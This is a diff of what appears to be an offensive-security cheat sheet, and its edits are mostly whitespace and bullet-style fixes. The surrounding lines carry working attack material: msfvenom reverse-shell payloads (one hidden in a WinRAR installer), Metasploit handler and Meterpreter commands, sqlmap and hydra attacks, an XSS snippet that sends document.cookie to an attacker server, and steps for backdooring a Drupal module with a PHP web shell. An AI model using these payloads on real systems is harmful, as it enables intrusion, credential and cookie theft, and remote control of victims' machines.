@@ -161,8 +161,8 @@ nmap -Pn -F -A <TARGET_IP>
 ## Timing (T0=slow ... T5=insanely fast) scan
 nmap -Pn -F -T5 -sV -O -sC <TARGET_IP> -v
 ## Output scan
-nmap -Pn -F -oN outputfile.txt <TARGET_IP> 
-nmap -Pn -F -oX outputfile.xml <TARGET_IP> 
+nmap -Pn -F -oN outputfile.txt <TARGET_IP>
+nmap -Pn -F -oX outputfile.xml <TARGET_IP>
 ## Output to all formats
 nmap -Pn -sV -sC -O -oA outputfile <TARGET_IP>
 nmap -Pn -sV -sC -O -oA outputfile <TARGET_IP>
@@ -178,7 +178,7 @@ sudo arp-scan -I eth1 <TARGET_IP/NETWORK>
 ping <TARGET_IP>
 sudo nmap -sn <TARGET_IP/NETWORK>
 
-tracert    google.com     #Windows 
+tracert    google.com     #Windows
 traceroute google.com     #Linux
 
 ## fping
@@ -706,7 +706,7 @@ psexec.py <USER>@<TARGET_IP> cmd.exe
 cd
 mkdir tools
 cd /home/kali/tools
-sudo git clone https://github.com/3ndG4me/AutoBlue-MS17-010.git 
+sudo git clone https://github.com/3ndG4me/AutoBlue-MS17-010.git
 cd AutoBlue-MS17-010
 pip install -r requirements.txt
 
@@ -829,7 +829,7 @@ pip install xlrd --upgrade
 setg RHOSTS <TARGET_IP>
 setg RHOST <TARGET_IP>
 
-use exploit/multi/handler 
+use exploit/multi/handler
 options
 set payload windows/x64/meterpreter/reverse_tcp
 set LHOST <LOCAL_HOST_IP>
@@ -865,7 +865,7 @@ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<LOCAL_HOST_IP> LPORT=<LOC
 setg RHOSTS <TARGET_IP>
 setg RHOST <TARGET_IP>
 
-use exploit/multi/handler 
+use exploit/multi/handler
 set payload windows/x64/meterpreter/reverse_tcp
 set LHOST <LOCAL_HOST_IP>
 set LPORT <LOCAL_PORT>
@@ -923,7 +923,7 @@ python -m SimpleHTTPServer 80
 setg RHOSTS <TARGET_IP>
 setg RHOST <TARGET_IP>
 
-use exploit/multi/handler 
+use exploit/multi/handler
 set payload windows/x64/meterpreter/reverse_tcp
 set LHOST <LOCAL_HOST_IP>
 set LPORT <LOCAL_PORT>
@@ -1161,7 +1161,7 @@ tshark -r <FILE>.pcap -Y "ip.src==<IP> && http" -Tfields -e http.user_agent
 # WiFi traffic filter
 tshark -r <FILE>.pcap -Y "wlan"
 
-# Only deauthentication packets 
+# Only deauthentication packets
 tshark -r <FILE>.pcap -Y "wlan.fc.type_subtype==0x000c"
 # and devices
 tshark -r <FILE>.pcap -Y "wlan.fc.type_subtype==0x000c" -Tfields -e wlan.ra
@@ -1268,12 +1268,12 @@ exploit
 ```bash
 # meterpreter > <command>
 
-background    #Switch from a Meterpreter session to the msfconsole command line 
+background    #Switch from a Meterpreter session to the msfconsole command line
 cat
 cd
 checksum md5 /bin/bash
 clearev
-download Filename /root/****   #Download From victm machine to your machine 
+download Filename /root/****   #Download From victm machine to your machine
 edit
 execute -f ifconfig
 getenv
@@ -1291,9 +1291,9 @@ pwd
 resource <file.txt>
 rmdir
 search -f *.txt
-shell   #run a standard operating system shell 
-sysinfo   #information about the victm Machine 
-upload /****/exploit.exe C://Windows     #Upload from your machine to victm machine   
+shell   #run a standard operating system shell
+sysinfo   #information about the victm Machine
+upload /****/exploit.exe C://Windows     #Upload from your machine to victm machine
 ```
 
 ### Info Gathering & Enumeration
@@ -1500,7 +1500,7 @@ msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<LOCAL_HOST_IP> LPORT=<LOCAL
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=<LOCAL_HOST_IP> LPORT=<LOCAL_PORT> -e x86/shikata_ga_nai -i 10 -f exe -x winrar-x32-621.exe > winrar.exe
 
 # JSP Java Meterpreter Reverse TCP
-msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Local IP Address> LPORT=<Local Port> -f raw > shell.jsp #TomCat content management system 
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Local IP Address> LPORT=<Local Port> -f raw > shell.jsp #TomCat content management system
 
 # PHP
 msfvenom -p php/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.php\                   #PHP Web Application
@@ -2021,7 +2021,7 @@ searchsploit -u
 searchsploit [options] <term>
 
 # Copy an exploit to the current working dir
-searchsploit -m <EXPLOIT_ID>    
+searchsploit -m <EXPLOIT_ID>
 # Case sensitive search
 searchsploit -c OpenSSH
 # Search just the exploit title
@@ -2637,7 +2637,7 @@ python -m SimpleHTTPServer <PORT_NUMBER>
 # Python 3.7
 python3 -m http.server <PORT_NUMBER>
 
-# On Windows, try 
+# On Windows, try
 python -m http.server <PORT>
 py -3 -m http.server <PORT>
 ```
@@ -2985,7 +2985,7 @@ wpscan --url http://<TARGET_IP> -U admin -P /usr/share/wordlists/rockyou.txt
 ```bash
 sqlmap -r <REQUEST_FILE> -p <POST_PARAMETER>
 sqlmap -r Post.req
-	
+
 sqlmap -u "http://<TARGET_IP>/sqli_1.php?title=hacking&action=search" --cookie "PHPSESSID=rmoepg39ac0savq89d1k5fu2q1; security_level=0" -p title
 
 sqlmap -u "http://10.10.10.10/file.php?id=1" -p id          #GET Method
@@ -3042,16 +3042,18 @@ Check an example:
 
 there are four components as follows:
 
-* attacker client pc
-* attacker logging server
-* vulnerable server
-* victim client pc
+- attacker client pc
+- attacker logging server
+- vulnerable server
+- victim client pc
 
 1. attacker: first finds a vulnerable server and its breach point.
 2. attacker: enter the following snippet in order to hijack the cookie kepts by victim client pc (p.s.: the ip address, 192.168.99.102, belongs to attacker logging server in this example):
 
 ```javascript
-<script>var i = new Image();i.src="http://192.168.99.102/log.php?q="+document.cookie;</script>
+<script>
+  var i = new Image();i.src="http://192.168.99.102/log.php?q="+document.cookie;
+</script>
 ```
 
 3. attacker: log into attacker logging server (P.S.: it is 192.168.99.102 in this example), and execute the following command:
@@ -3097,33 +3099,34 @@ hydra -L <USERS_LIST> -P <PW_LIST> <TARGET_IP> http-post-form "/login.php:login=
 
 In **wp-config.php** you can find the root password of the database.
 
-Default login paths to check: _**/wp-login.php, /wp-login/, /wp-admin/, /wp-admin.php, /login/**
+Default login paths to check: \_**/wp-login.php, /wp-login/, /wp-admin/, /wp-admin.php, /login/**
+
 #### **Main WordPress Files**
 
-* `index.php`
-* `license.txt` contains useful information such as the version WordPress installed.
-* `wp-activate.php` is used for the email activation process when setting up a new WordPress site.
-* Login folders (may be renamed to hide it):
-  * `/wp-admin/login.php`
-  * `/wp-admin/wp-login.php`
-  * `/login.php`
-  * `/wp-login.php`
-* `xmlrpc.php` is a file that represents a feature of WordPress that enables data to be transmitted with HTTP acting as the transport mechanism and XML as the encoding mechanism. This type of communication has been replaced by the WordPress [REST API](https://developer.wordpress.org/rest-api/reference).
-* The `wp-content` folder is the main directory where plugins and themes are stored.
-* `wp-content/uploads/` Is the directory where any files uploaded to the platform are stored.
-* `wp-includes/` This is the directory where core files are stored, such as certificates, fonts, JavaScript files, and widgets.
+- `index.php`
+- `license.txt` contains useful information such as the version WordPress installed.
+- `wp-activate.php` is used for the email activation process when setting up a new WordPress site.
+- Login folders (may be renamed to hide it):
+  - `/wp-admin/login.php`
+  - `/wp-admin/wp-login.php`
+  - `/login.php`
+  - `/wp-login.php`
+- `xmlrpc.php` is a file that represents a feature of WordPress that enables data to be transmitted with HTTP acting as the transport mechanism and XML as the encoding mechanism. This type of communication has been replaced by the WordPress [REST API](https://developer.wordpress.org/rest-api/reference).
+- The `wp-content` folder is the main directory where plugins and themes are stored.
+- `wp-content/uploads/` Is the directory where any files uploaded to the platform are stored.
+- `wp-includes/` This is the directory where core files are stored, such as certificates, fonts, JavaScript files, and widgets.
 
 **Post exploitation**
 
-* The `wp-config.php` file contains information required by WordPress to connect to the database such as the database name, database host, username and password, authentication keys and salts, and the database table prefix. This configuration file can also be used to activate DEBUG mode, which can useful in troubleshooting.
+- The `wp-config.php` file contains information required by WordPress to connect to the database such as the database name, database host, username and password, authentication keys and salts, and the database table prefix. This configuration file can also be used to activate DEBUG mode, which can useful in troubleshooting.
 
 #### Users Permissions
 
-* **Administrator**
-* **Editor**: Publish and manages his and others posts
-* **Author**: Publish and manage his own posts
-* **Contributor**: Write and manage his posts but cannot publish them
-* **Subscriber**: Browser posts and edit their profile
+- **Administrator**
+- **Editor**: Publish and manages his and others posts
+- **Author**: Publish and manage his own posts
+- **Contributor**: Write and manage his posts but cannot publish them
+- **Subscriber**: Browser posts and edit their profile
 
 ### **Passive Enumeration**
 
@@ -3133,13 +3136,13 @@ Check if you can find the files `/license.txt` or `/readme.html`
 
 Inside the **source code** of the page (example from [https://wordpress.org/support/article/pages/](https://wordpress.org/support/article/pages/)):
 
-* Grep
+- Grep
 
 ```bash
 curl https://victim.com/ | grep 'content="WordPress'
 ```
 
-* Meta name
+- Meta name
 
 <div align="left">
 
@@ -3147,11 +3150,11 @@ curl https://victim.com/ | grep 'content="WordPress'
 
 </div>
 
-* CSS link files
+- CSS link files
 
 <figure><img src=".gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
 
-* JavaScript files
+- JavaScript files
 
 <figure><img src=".gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>
 
@@ -3243,13 +3246,13 @@ msf exploit(wp_admin_shell_upload) > exploit
 
 ## Discovery
 
-* Check **meta**
+- Check **meta**
 
 ```bash
 curl https://www.drupal.org/ | grep 'content="Drupal'
 ```
 
-* **Node**: Drupal **indexes its content using nodes**. A node can **hold anything** such as a blog post, poll, article, etc. The page URIs are usually of the form `/node/<nodeid>`.
+- **Node**: Drupal **indexes its content using nodes**. A node can **hold anything** such as a blog post, poll, article, etc. The page URIs are usually of the form `/node/<nodeid>`.
 
 ```bash
 curl drupal-site.com/node/1
@@ -3265,7 +3268,7 @@ Drupal supports **three types of users** by default:
 
 ### Version
 
-* Check `/CHANGELOG.txt`
+- Check `/CHANGELOG.txt`
 
 ```bash
 curl -s http://drupal-site.local/CHANGELOG.txt | grep -m2 ""
@@ -3364,14 +3367,14 @@ From version **8 onwards, the** [**PHP Filter**](https://www.drupal.org/project/
 
 A backdoored module can be created by **adding a shell to an existing module**. Modules can be found on the drupal.org website. Let's pick a module such as [CAPTCHA](https://www.drupal.org/project/captcha). Scroll down and copy the link for the tar.gz [archive](https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz).
 
-* Download the archive and extract its contents.
+- Download the archive and extract its contents.
 
 ```
 wget --no-check-certificate  https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz
 tar xvf captcha-8.x-1.2.tar.gz
 ```
 
-* Create a **PHP web shell** with the contents:
+- Create a **PHP web shell** with the contents:
 
 ```php
 <?php
@@ -3379,24 +3382,21 @@ system($_GET["cmd"]);
 ?>
 ```
 
-* Next, we need to create a **`.htaccess`** file to give ourselves access to the folder. This is necessary as Drupal denies direct access to the **`/modules`** folder.
+- Next, we need to create a **`.htaccess`** file to give ourselves access to the folder. This is necessary as Drupal denies direct access to the **`/modules`** folder.
 
 ```html
-<IfModule mod_rewrite.c>
-RewriteEngine On
-RewriteBase /
-</IfModule>
+<IfModule mod_rewrite.c> RewriteEngine On RewriteBase / </IfModule>
 ```
 
-* The configuration above will apply rules for the / folder when we request a file in /modules. Copy both of these files to the captcha folder and create an archive.
+- The configuration above will apply rules for the / folder when we request a file in /modules. Copy both of these files to the captcha folder and create an archive.
 
 ```bash
 mv shell.php .htaccess captcha
 tar cvf captcha.tar.gz captcha/
 ```
 
-* Assuming we have **administrative access** to the website, click on **`Manage`** and then **`Extend`** on the sidebar. Next, click on the **`+ Install new module`** button, and we will be taken to the install page, such as `http://drupal-site.local/admin/modules/install` Browse to the backdoored Captcha archive and click **`Install`**.
-* Once the installation succeeds, browse to **`/modules/captcha/shell.php`** to execute commands.
+- Assuming we have **administrative access** to the website, click on **`Manage`** and then **`Extend`** on the sidebar. Next, click on the **`+ Install new module`** button, and we will be taken to the install page, such as `http://drupal-site.local/admin/modules/install` Browse to the backdoored Captcha archive and click **`Install`**.
+- Once the installation succeeds, browse to **`/modules/captcha/shell.php`** to execute commands.
 
 #### Post Exploitation
 
